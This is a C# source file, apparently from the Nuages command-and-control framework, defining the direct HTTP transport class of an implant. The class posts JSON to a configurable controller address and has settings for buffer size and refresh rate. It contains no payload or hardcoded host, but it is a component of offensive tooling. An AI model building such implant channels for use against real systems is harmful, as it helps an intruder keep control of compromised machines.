using System;
using System.Collections.Generic;
using System.IO;
using System.Net;

namespace NuagesSharpImplant
{
    public class DirectConnection : NuagesC2Connection
    {
        private string connectionString;

        private string handler = "Direct";

        public int refreshrate;

        public int buffersize;

        public DirectConnection(string connectionString, int buffersize, int refreshrate)
        {
            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        public void setRefreshRate(int refreshrate) {

            this.refreshrate = refreshrate;
       
        }

        public void setBufferSize(int buffersize) {

            this.buffersize = buffersize;
        
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public string POST(string url, string jsonContent)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString + url);
            request.Method = "POST";

            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
            Byte[] byteArray = encoding.GetBytes(jsonContent);

            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/json";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
                    return reader.ReadToEnd();
                }
            }
        }
    }

}
